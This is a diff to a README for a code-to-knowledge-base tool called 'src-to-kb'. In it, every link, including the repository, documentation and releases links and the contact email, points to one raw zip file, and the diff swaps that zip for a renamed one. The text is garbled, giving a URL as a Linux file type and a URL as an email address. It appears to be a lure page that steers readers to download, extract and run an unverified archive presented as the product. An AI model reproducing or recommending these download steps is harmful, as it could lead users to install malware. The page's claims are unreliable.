@@ -1,6 +1,6 @@
 # 🌟 src-to-kb - Transform Code Into Knowledge Effortlessly
 
-[![Download](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip)
+[![Download](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to src-to-kb! This application converts your source code into a knowledg
 
 To get started, you need to download the application. Visit the following page to download the latest version of src-to-kb:
 
-[Download src-to-kb Releases](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip)
+[Download src-to-kb Releases](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip)
 
-Once you're on the Releases page, find the version number that you wish to download. Click on the appropriate link for your operating system. The downloads may include files such as .exe for Windows or https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip for Linux. 
+Once you're on the Releases page, find the version number that you wish to download. Click on the appropriate link for your operating system. The downloads may include files such as .exe for Windows or https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip for Linux. 
 
 ### Step-by-Step Installation
 
@@ -22,7 +22,7 @@ Once you're on the Releases page, find the version number that you wish to downl
 4. **Locate the Downloaded File**: Open your Downloads folder once the file is downloaded.
 5. **Run the Installer** (if applicable):
    - **Windows**: Double-click the .exe file to start the installation.
-   - **Linux**: If you downloaded a https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip file, extract it, open a terminal in the extracted folder, and run the application.
+   - **Linux**: If you downloaded a https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip file, extract it, open a terminal in the extracted folder, and run the application.
 6. **Follow the Prompts**: The installer will guide you through the necessary steps. 
 
 ## 📊 Features
@@ -68,8 +68,8 @@ If you encounter any issues, try the following solutions:
 
 For more details or to get involved in the project, visit:
 
-- [GitHub Repository](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip)
-- [Documentation](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip)
 
 ## 🎉 Community & Support
 
@@ -77,6 +77,6 @@ Feel free to reach out to our community or support team if you have any question
 
 ## 📬 Contact Us
 
-For direct inquiries or support requests, you can email the team at https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-to-kb.zip We are here to help you make the most out of src-to-kb.
+For direct inquiries or support requests, you can email the team at https://raw.githubusercontent.com/przemek388/src-to-kb/main/diclinism/src-kb-to-1.9.zip We are here to help you make the most out of src-to-kb.
 
 Thank you for using src-to-kb! We hope it helps you transform your code into useful knowledge effortlessly.
